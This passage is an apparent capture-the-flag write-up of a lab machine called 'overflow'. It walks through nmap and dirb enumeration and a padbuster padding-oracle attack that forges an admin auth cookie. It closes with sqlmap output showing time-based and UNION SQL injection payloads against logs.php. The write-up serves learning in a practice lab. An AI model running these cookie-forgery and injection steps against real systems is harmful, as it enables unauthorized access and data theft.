+<span class="hljs-attr">UDP Scan Timing:</span> <span class="hljs-string">About</span> <span class="hljs-number">85.04</span><span class="hljs-string">%</span> <span class="hljs-string">done;</span> <span class="hljs-attr">ETC:</span> <span class="hljs-number">18</span><span class="hljs-string">:53</span> <span class="hljs-string">(0:02:37</span> <span class="hljs-string">remaining)</span>
+<span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-string">overflow</span> <span class="hljs-string">(10.129.253.67)</span>
+<span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.052s</span> <span class="hljs-string">latency).</span>
+<span class="hljs-attr">Not shown:</span> <span class="hljs-number">999</span> <span class="hljs-string">closed</span> <span class="hljs-string">ports</span>
+<span class="hljs-string">PORT</span>   <span class="hljs-string">STATE</span>         <span class="hljs-string">SERVICE</span>
+<span class="hljs-number">68</span><span class="hljs-string">/udp</span> <span class="hljs-string">open|filtered</span> <span class="hljs-string">dhcpc</span>
+
+<span class="hljs-attr">Nmap done:</span> <span class="hljs-number">1</span> <span class="hljs-string">IP</span> <span class="hljs-string">address</span> <span class="hljs-string">(1</span> <span class="hljs-string">host</span> <span class="hljs-string">up)</span> <span class="hljs-string">scanned</span> <span class="hljs-string">in</span> <span class="hljs-number">1088.49 </span><span class="hljs-string">seconds</span>
+</code></pre></div>
+<p>We check the website on 80.<br>
+Logging in as admin:admin did not work.  Registered new user groovy:groovy<br>
+<img src="_resources/6c6708d46d3e47c7a4bac62ef3776bb5.png" alt="11def9dbf0661a2229ca75e7323fd55a.png"></p>
+<p>That let us in.  Static profile and blog pages are available.  Looking at the blog page, there are a number of vulerabilities listed.  Could these be a hint?  I spent some time working through each one, but was not successful.</p>
+<p><img src="_resources/4c74dcadc9ee43e586c43fb3ccabc44f.png" alt="51a607ec8461a004aa12712606164dcc.png"></p>
+<p>We need to do some additional enumeration to see if there are any hidden folders or directories.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ dirb http://overflow/config/ /usr/share/wordlists/dirb/big.txt -X .php -o tcp_80_http_dirb_config_php.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: tcp_80_http_dirb_config_php.txt
+START_TIME: Wed Nov 10 17:18:46 2021
+URL_BASE: http://overflow/config/
+WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://overflow/config/ ----
++ http://overflow/config/auth.php (CODE:200|SIZE:0)                                            
++ http://overflow/config/db.php (CODE:200|SIZE:0)                                              
++ http://overflow/config/users.php (CODE:200|SIZE:0)                                           
+                                                                                               
+-----------------
+END_TIME: Wed Nov 10 17:35:48 2021
+DOWNLOADED: 20458 - FOUND: 3</pre><pre class="hljs"><code>$ dirb http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/config/</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/big.txt -X .php -o tcp_80_http_dirb_config_php.txt
+
+-----------------
+DIRB v2.<span class="hljs-number">22</span>    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: tcp_80_http_dirb_config_php.txt
+START_TIME: Wed Nov <span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">18</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span>
+URL_BASE: http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/config/</span>
+WORDLIST_FILES: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/big.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = <span class="hljs-number">1</span>]
+
+-----------------
+
+GENERATED WORDS: <span class="hljs-number">20458</span>                                                         
+
+---- Scanning URL: http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/config/</span> ----
++ http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/config/</span>auth.php (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">0</span>)                                            
++ http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/config/</span>db.php (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">0</span>)                                              
++ http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/config/u</span>sers.php (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">0</span>)                                           
+                                                                                               
+-----------------
+END_TIME: Wed Nov <span class="hljs-number">10</span> <span class="hljs-number">17</span>:<span class="hljs-number">35</span>:<span class="hljs-number">48</span> <span class="hljs-number">2021</span>
+DOWNLOADED: <span class="hljs-number">20458</span> - FOUND: <span class="hljs-number">3</span></code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ dirb http://overflow/home -X .php -o tcp_80_http_dirb_home_php.txt      [21-11-10 15:02:13]
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: tcp_80_http_dirb_home_php.txt
+START_TIME: Wed Nov 10 15:03:04 2021
+URL_BASE: http://overflow/home/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://overflow/home/ ----
++ http://overflow/home/blog.php (CODE:200|SIZE:2971)                                           
++ http://overflow/home/index.php (CODE:302|SIZE:12503)                                         
++ http://overflow/home/logs.php (CODE:200|SIZE:14)                                             
+                                                                                               
+-----------------
+END_TIME: Wed Nov 10 15:06:57 2021
+DOWNLOADED: 4612 - FOUND: 3</pre><pre class="hljs"><code>$ dirb http:<span class="hljs-regexp">//</span>overflow/home -X .php -o tcp_80_http_dirb_home_php.txt      [<span class="hljs-number">21</span>-<span class="hljs-number">11</span>-<span class="hljs-number">10</span> <span class="hljs-number">15</span>:<span class="hljs-number">02</span>:<span class="hljs-number">13</span>]
+
+-----------------
+DIRB v2.<span class="hljs-number">22</span>    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: tcp_80_http_dirb_home_php.txt
+START_TIME: Wed Nov <span class="hljs-number">10</span> <span class="hljs-number">15</span>:<span class="hljs-number">03</span>:<span class="hljs-number">04</span> <span class="hljs-number">2021</span>
+URL_BASE: http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/home/</span>
+WORDLIST_FILES: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/common.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = <span class="hljs-number">1</span>]
+
+-----------------
+
+GENERATED WORDS: <span class="hljs-number">4612</span>                                                          
+
+---- Scanning URL: http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/home/</span> ----
++ http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/home/</span>blog.php (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">2971</span>)                                           
++ http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/home/i</span>ndex.php (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">12503</span>)                                         
++ http:<span class="hljs-regexp">//</span>overflow<span class="hljs-regexp">/home/</span>logs.php (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">14</span>)                                             
+                                                                                               
+-----------------
+END_TIME: Wed Nov <span class="hljs-number">10</span> <span class="hljs-number">15</span>:<span class="hljs-number">06</span>:<span class="hljs-number">57</span> <span class="hljs-number">2021</span>
+DOWNLOADED: <span class="hljs-number">4612</span> - FOUND: <span class="hljs-number">3</span></code></pre></div>
+<p>logs.php is new.<br>
+<img src="_resources/179cbda4ec824955bce4e99971e6fc30.png" alt="abd0784051cd19086053317df6408293.png"></p>
+<p>Looks like we need to be admin or at least bypass the authorization checks.</p>
+<p>Digging into the headers, I noticed that after registering an account we are given an &quot;Auth&quot; cookie value.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">GET /home/index.php HTTP/1.1
+Host: overflow
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://overflow/register.php
+Connection: close
+Cookie: auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E
+Upgrade-Insecure-Requests: 1</pre><pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/home/index.php</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>overflow
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
+<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://overflow/register.php
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1</code></pre></div>
+<p>Trying to decode the value doesn't provide anything useful.</p>
+<p><img src="_resources/3666a48eb9ff4b29ad323e4c7394bab6.png" alt="c446dad01904a4d0c7f306ed1c395405.png"></p>
+<p>Let's modify the value and see what the program does.</p>
+<p><img src="_resources/3caeffd6ab31495a8e7a060e38238fa0.png" alt="7414cd2e985deaa288a6b85bfb0ea731.png"><br>
+If we modify the value by adding or removing characters, we receive a 302 HTTP code.</p>
+<p><img src="_resources/420647f635b7477789ccf93bce315054.png" alt="9309fab0d6a41cd6a01cc9f10a07bf24.png"></p>
+<p>This could be indicitive of CBC encryption, which can be reversed using a Padding Oracle Attack.</p>
+<p>Here's a good introductory reference: <a data-from-md title='https://pentesterlab.com/exercises/padding_oracle/course' href='https://pentesterlab.com/exercises/padding_oracle/course'>https://pentesterlab.com/exercises/padding_oracle/course</a></p>
+<p>We'll use padbuster to attempt the padding oracle attack.</p>
+<p><code class="inline-code">sudo apt install padbuster</code></p>
+<p>The original cookie from my screenshot seemed to have expired, so I registered a new account and extracted the cookie.  Now we put this into our padbuster command.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">padbuster http://overflow/home/index.php TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E 8 -cookies auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E -encoding 0                           
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 12503
+
+INFO: Starting PadBuster Decrypt Mode
+*** Starting Block 1 of 2 ***
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#     Freq    Status  Length  Location
+-------------------------------------------------------
+1       1       302     12503   ../login.php
+2 **    255     302     0       ../logout.php?err=1
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended : 2
+</pre><pre class="hljs"><code>padbuster http://overflow/home/index.php TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E 8 -cookies auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E -encoding 0                           
+
+<span class="hljs-code">+-------------------------------------------+</span>
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+<span class="hljs-section">| labs@gdssecurity.com                      |
++-------------------------------------------+</span>
+
+INFO: The original request returned the following
+[+] Status: 200
+[+] Location: N/A
+[+] Content Length: 12503
+
+INFO: Starting PadBuster Decrypt Mode
+<span class="hljs-bullet">*** </span>Starting Block 1 of 2 <span class="hljs-strong">***</span>
+
+INFO: No error string was provided...starting response analysis
+
+<span class="hljs-bullet">*** </span>Response Analysis Complete <span class="hljs-strong">***</span>
+
+The following response signatures were returned:
+
+<span class="hljs-code">-------------------------------------------------------
+ID#     Freq    Status  Length  Location
+-------------------------------------------------------</span>
+1       1       302     12503   ../login.php
+<span class="hljs-section">2 **    255     302     0       ../logout.php?err=1
+-------------------------------------------------------</span>
+
+Enter an ID that matches the error condition
+<span class="hljs-symbol">NOTE: </span>The ID# marked with ** is recommended : 2
+</code></pre></div>
+<p>We choose #2, which was recommended.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Continuing test with selection 2
+
+[+] Success: (76/256) [Byte 8]
+[+] Success: (23/256) [Byte 7]
+[+] Success: (41/256) [Byte 6]
+[+] Success: (10/256) [Byte 5]
+[+] Success: (108/256) [Byte 4]
+[+] Success: (56/256) [Byte 3]
+[+] Success: (11/256) [Byte 2]
+[+] Success: (208/256) [Byte 1]
+
+Block 1 Results:
+[+] Cipher Text (HEX): 863d3a37f6bf0583
+[+] Intermediate Bytes (HEX): 38f2ce91f2d4ebb5
+[+] Plain Text: user=gro
+
+Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 1.
+*** Starting Block 2 of 2 ***
+
+[+] Success: (121/256) [Byte 8]
+[+] Success: (254/256) [Byte 7]
+[+] Success: (71/256) [Byte 6]
+[+] Success: (9/256) [Byte 5]
+[+] Success: (201/256) [Byte 4]
+[+] Success: (187/256) [Byte 3]
+[+] Success: (180/256) [Byte 2]
+[+] Success: (31/256) [Byte 1]
+
+Block 2 Results:
+[+] Cipher Text (HEX): 575af2fa8f2fad44
+[+] Intermediate Bytes (HEX): e94b4332f3ba0086
+[+] Plain Text: ovy
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Decrypted value (ASCII): user=groovy
+
+[+] Decrypted value (HEX): 757365723D67726F6F76790505050505
+
+[+] Decrypted value (Base64): dXNlcj1ncm9vdnkFBQUFBQ==
+
+-------------------------------------------------------</pre><pre class="hljs"><code>Continuing test with selection 2
+
+<span class="hljs-comment">[+]</span> Success: (76/256) <span class="hljs-comment">[Byte 8]</span>
+<span class="hljs-comment">[+]</span> Success: (23/256) <span class="hljs-comment">[Byte 7]</span>
+<span class="hljs-comment">[+]</span> Success: (41/256) <span class="hljs-comment">[Byte 6]</span>
+<span class="hljs-comment">[+]</span> Success: (10/256) <span class="hljs-comment">[Byte 5]</span>
+<span class="hljs-comment">[+]</span> Success: (108/256) <span class="hljs-comment">[Byte 4]</span>
+<span class="hljs-comment">[+]</span> Success: (56/256) <span class="hljs-comment">[Byte 3]</span>
+<span class="hljs-comment">[+]</span> Success: (11/256) <span class="hljs-comment">[Byte 2]</span>
+<span class="hljs-comment">[+]</span> Success: (208/256) <span class="hljs-comment">[Byte 1]</span>
+
+Block 1 Results:
+<span class="hljs-comment">[+]</span> Cipher Text (HEX): 863d3a37f6bf0583
+<span class="hljs-comment">[+]</span> Intermediate Bytes (HEX): 38f2ce91f2d4ebb5
+<span class="hljs-comment">[+]</span> Plain Text: user=gro
+
+Use <span class="hljs-keyword">of</span> uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 1.
+*** Starting Block 2 <span class="hljs-keyword">of</span> 2 ***
+
+<span class="hljs-comment">[+]</span> Success: (121/256) <span class="hljs-comment">[Byte 8]</span>
+<span class="hljs-comment">[+]</span> Success: (254/256) <span class="hljs-comment">[Byte 7]</span>
+<span class="hljs-comment">[+]</span> Success: (71/256) <span class="hljs-comment">[Byte 6]</span>
+<span class="hljs-comment">[+]</span> Success: (9/256) <span class="hljs-comment">[Byte 5]</span>
+<span class="hljs-comment">[+]</span> Success: (201/256) <span class="hljs-comment">[Byte 4]</span>
+<span class="hljs-comment">[+]</span> Success: (187/256) <span class="hljs-comment">[Byte 3]</span>
+<span class="hljs-comment">[+]</span> Success: (180/256) <span class="hljs-comment">[Byte 2]</span>
+<span class="hljs-comment">[+]</span> Success: (31/256) <span class="hljs-comment">[Byte 1]</span>
+
+Block 2 Results:
+<span class="hljs-comment">[+]</span> Cipher Text (HEX): 575af2fa8f2fad44
+<span class="hljs-comment">[+]</span> Intermediate Bytes (HEX): e94b4332f3ba0086
+<span class="hljs-comment">[+]</span> Plain Text: ovy
+
+-------------------------------------------------------
+** Finished ***
+
+<span class="hljs-comment">[+]</span> Decrypted value (ASCII): user=groovy
+
+<span class="hljs-comment">[+]</span> Decrypted value (HEX): 757365723D67726F6F76790505050505
+
+<span class="hljs-comment">[+]</span> Decrypted value (Base64): dXNlcj1ncm9vdnkFBQUFBQ==
+
+-------------------------------------------------------</code></pre></div>
+<p>We've successfully reversed the encryption.  The cipher value is user=groovy, which was the username registered.  Now that we know the cipher value syntax, we'll use padbuster to generate a new cipher for admin.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">padbuster http://overflow/home/index.php TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E 8 -cookies auth=TYGr48%2BzmdqGPTo39r8Fg1da8vqPL61E -encoding 0 -plaintext &quot;user=Admin&quot;</pre><pre class="hljs"><code><span class="hljs-attribute">padbuster</span> http://overflow/home/index.php TYGr48%<span class="hljs-number">2</span>BzmdqGPTo39r8Fg1da8vqPL61E <span class="hljs-number">8</span> -cookies auth=TYGr48%<span class="hljs-number">2</span>BzmdqGPTo39r8Fg1da8vqPL61E -encoding <span class="hljs-number">0</span> -plaintext <span class="hljs-string">&quot;user=Admin&quot;</span></code></pre></div>
+<p>We have our encrypted value:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">** Finished ***
+
+[+] Encrypted value is: BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA</pre><pre class="hljs"><code>** Finished ***
+
+[+] <span class="hljs-keyword">Encrypted</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span>: BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA</code></pre></div>
+<p>We'll add a match and replace value in burp with the new cookie value.<br>
+<img src="_resources/d045b53a54e74d0d99ca93794438ec1e.png" alt="0423ed51cc90e941a2462a2844c1f911.png"></p>
+<p>Visiting the website now provides us with additional admin options.<br>
+<img src="_resources/68f5d3ee8dfc40ddb72b1e3c16daac87.png" alt="f289b97e393ff9216aaae3f303754308.png"></p>
+<p>Let's check out the admin panel.</p>
+<p><img src="_resources/da4cfe04aecb4c29830e2a8b58195024.png" alt="8f083cb8f9ad5ddef28df79916a41b6f.png"><br>
+admin:admin did not work.</p>
+<p>There are a ton of exploits for CMS made simple, but most require authentication and we don't know what version we're dealing with here.</p>
+<p>Going to the logs.php page directly no longer gives us the Unauthorized message.  However, we are greeted with a blank page.</p>
+<p>The logs link on the admin's home page doesn't work; only bringing up an &quot;undefined&quot; pop-up.<br>
+<img src="_resources/2b41502e784940fd86170413a33c2ded.png" alt="04482b5326fcffe2757980df38782ace.png"></p>
+<p>I looked at the source code to see how it was configured and noticed an interesting script.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">&lt;script src='../config/admin_last_login.js'&gt;&lt;/script&gt;</pre><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;../config/admin_last_login.js&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+<p>Now we're talking.</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">async function getUsers() {
+    let url = 'http://overflow.htb/home/logs.php?name=admin';
+    try {
+        let res = await fetch(url);
+        return await res.text();
+    } catch (error) {
+        console.log(error);
+    }
+}
+
+async function renderUsers() {
+    let users = await getUsers();
+    let html = '';
+    let container = document.querySelector('.content');
+    container.innerHTML = users;
+}
+
+renderUsers();</pre><pre class="hljs"><code><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUsers</span>(<span class="hljs-params"></span>) </span>{
+    <span class="hljs-keyword">let</span> <span class="hljs-built_in">url</span> = <span class="hljs-string">&#x27;http://overflow.htb/home/logs.php?name=admin&#x27;</span>;
+    <span class="hljs-title">try</span> {
+        <span class="hljs-keyword">let</span> res = <span class="hljs-keyword">await</span> fetch(<span class="hljs-built_in">url</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> res.text();
+    } <span class="hljs-keyword">catch</span> (error) {
+        <span class="hljs-built_in">console</span>.log(error);
+    }
+}
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">renderUsers</span>(<span class="hljs-params"></span>) </span>{
+    <span class="hljs-keyword">let</span> users = <span class="hljs-keyword">await</span> getUsers();
+    <span class="hljs-keyword">let</span> html = <span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-keyword">let</span> container = <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;.content&#x27;</span>);
+    container.innerHTML = users;
+}
+
+renderUsers();</code></pre></div>
+<p>It seems the logs.php page requires input to work.</p>
+<p><img src="_resources/6e40ade03566482d986ab1da4cc2d326.png" alt="0798941c0534f3231f56db51aa2f9cf4.png"></p>
+<p>We need to find the version of the CMS software running.  Because it's open source, I looked up the source code and identified a file we could check which would provide the version.</p>
+<p><a data-from-md title='http://viewsvn.cmsmadesimple.org/filedetails.php?repname=cmsmadesimple&amp;path=%2Fbranches%2Fv2.1.x%2Fdoc%2FCHANGELOG.txt' href='http://viewsvn.cmsmadesimple.org/filedetails.php?repname=cmsmadesimple&amp;path=%2Fbranches%2Fv2.1.x%2Fdoc%2FCHANGELOG.txt'>http://viewsvn.cmsmadesimple.org/filedetails.php?repname=cmsmadesimple&amp;path=%2Fbranches%2Fv2.1.x%2Fdoc%2FCHANGELOG.txt</a></p>
+<p>And bingo, the file exists on our server and we identify the version of CMS Made Simple as 2.2.8</p>
+<p><img src="_resources/5521eab0260546e5bb23739917c364c3.png" alt="a87b0cc7f1b48d054c38fd7ac93882b6.png"></p>
+<p>With the version number in hand, let's research any available exploits</p>
+<p><a data-from-md title='https://www.exploit-db.com/exploits/46635' href='https://www.exploit-db.com/exploits/46635'>CMS Made Simple &lt; 2.2.10 - SQL Injection</a></p>
+<p>Digging into the log.php page a bit more.  We ran sqlmap against the name parameter and discovered the value was vulenrable to injection</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">$ sqlmap -u http://overflow.htb/home/logs.php?name= --cookie auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA                             [21-11-14 16:12:24]
+        ___
+       __H__
+ ___ ___[&quot;]_____ ___ ___  {1.5.10#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:12:59 /2021-11-14/
+
+[16:12:59] [WARNING] provided value for parameter 'name' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[16:12:59] [INFO] resuming back-end DBMS 'mysql' 
+[16:12:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: name (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: name=') AND (SELECT 4596 FROM (SELECT(SLEEP(5)))mZCZ) AND ('YfJn'='YfJn
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: name=') UNION ALL SELECT NULL,NULL,CONCAT(0x717a627071,0x47424b5376754a717a694d50714d78717978544b457664636c746f65504b58536f4a57764468546d,0x716a707a71)-- -
+---
+[16:13:00] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL &gt;= 5.0.12
+[16:13:00] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/overflow.htb'
+
+[*] ending @ 16:13:00 /2021-11-14/
+</pre><pre class="hljs"><code><span class="hljs-string">$</span> <span class="hljs-string">sqlmap</span> <span class="hljs-string">-u</span> <span class="hljs-string">http://overflow.htb/home/logs.php?name=</span> <span class="hljs-string">--cookie</span> <span class="hljs-string">auth=BAitGdYOupMjA3gl1aFoOwAAAAAAAAAA</span>                             [<span class="hljs-number">21</span><span class="hljs-number">-11</span><span class="hljs-number">-14</span> <span class="hljs-number">16</span><span class="hljs-string">:12:24</span>]
+        <span class="hljs-string">___</span>
+       <span class="hljs-string">__H__</span>
+ <span class="hljs-string">___</span> <span class="hljs-string">___[&quot;]_____</span> <span class="hljs-string">___</span> <span class="hljs-string">___</span>  {<span class="hljs-number">1.5</span><span class="hljs-number">.10</span><span class="hljs-comment">#stable}</span>
+<span class="hljs-string">|_</span> <span class="hljs-string">-|</span> <span class="hljs-string">.</span> [,]     <span class="hljs-string">|</span> <span class="hljs-string">.&#x27;|</span> <span class="hljs-string">.</span> <span class="hljs-string">|</span>
+<span class="hljs-string">|___|_</span>  [<span class="hljs-string">.</span>]<span class="hljs-string">_|_|_|__</span>,<span class="hljs-string">|</span>  <span class="hljs-string">_|</span>
+      <span class="hljs-string">|_|V...</span>       <span class="hljs-string">|_|</span>   <span class="hljs-string">https://sqlmap.org</span>
+
+[<span class="hljs-type">!]</span> <span class="hljs-attr">legal disclaimer:</span> <span class="hljs-string">Usage</span> <span class="hljs-string">of</span> <span class="hljs-string">sqlmap</span> <span class="hljs-string">for</span> <span class="hljs-string">attacking</span> <span class="hljs-string">targets</span> <span class="hljs-string">without</span> <span class="hljs-string">prior</span> <span class="hljs-string">mutual</span> <span class="hljs-string">consent</span> <span class="hljs-string">is</span> <span class="hljs-string">illegal.</span> <span class="hljs-string">It</span> <span class="hljs-string">is</span> <span class="hljs-string">the</span> <span class="hljs-string">end</span> <span class="hljs-string">user&#x27;s</span> <span class="hljs-string">responsibility</span> <span class="hljs-string">to</span> <span class="hljs-string">obey</span> <span class="hljs-string">all</span> <span class="hljs-string">applicable</span> <span class="hljs-string">local</span>, <span class="hljs-string">state</span> <span class="hljs-string">and</span> <span class="hljs-string">federal</span> <span class="hljs-string">laws.</span> <span class="hljs-string">Developers</span> <span class="hljs-string">assume</span> <span class="hljs-literal">no</span> <span class="hljs-string">liability</span> <span class="hljs-string">and</span> <span class="hljs-string">are</span> <span class="hljs-string">not</span> <span class="hljs-string">responsible</span> <span class="hljs-string">for</span> <span class="hljs-string">any</span> <span class="hljs-string">misuse</span> <span class="hljs-string">or</span> <span class="hljs-string">damage</span> <span class="hljs-string">caused</span> <span class="hljs-string">by</span> <span class="hljs-string">this</span> <span class="hljs-string">program</span>
+
+[<span class="hljs-string">*</span>] <span class="hljs-string">starting</span> <span class="hljs-string">@</span> <span class="hljs-number">16</span><span class="hljs-string">:12:59</span> <span class="hljs-string">/2021-11-14/</span>
+
+[<span class="hljs-number">16</span><span class="hljs-string">:12:59</span>] [<span class="hljs-string">WARNING</span>] <span class="hljs-string">provided</span> <span class="hljs-string">value</span> <span class="hljs-string">for</span> <span class="hljs-string">parameter</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-string">is</span> <span class="hljs-string">empty.</span> <span class="hljs-string">Please</span>, <span class="hljs-string">always</span> <span class="hljs-string">use</span> <span class="hljs-string">only</span> <span class="hljs-string">valid</span> <span class="hljs-string">parameter</span> <span class="hljs-string">values</span> <span class="hljs-string">so</span> <span class="hljs-string">sqlmap</span> <span class="hljs-string">could</span> <span class="hljs-string">be</span> <span class="hljs-string">able</span> <span class="hljs-string">to</span> <span class="hljs-string">run</span> <span class="hljs-string">properly</span>
+[<span class="hljs-number">16</span><span class="hljs-string">:12:59</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-string">resuming</span> <span class="hljs-string">back-end</span> <span class="hljs-string">DBMS</span> <span class="hljs-string">&#x27;mysql&#x27;</span> 
+[<span class="hljs-number">16</span><span class="hljs-string">:12:59</span>] [<span class="hljs-string">INFO</span>] <span class="hljs-string">testing</span> <span class="hljs-string">connection</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">target</span> <span class="hljs-string">URL</span>
+<span class="hljs-string">sqlmap</span> <span class="hljs-string">resumed</span> <span class="hljs-string">the</span> <span class="hljs-string">following</span> <span class="hljs-string">injection</span> <span class="hljs-string">point(s)</span> <span class="hljs-attr">from stored session:</span>
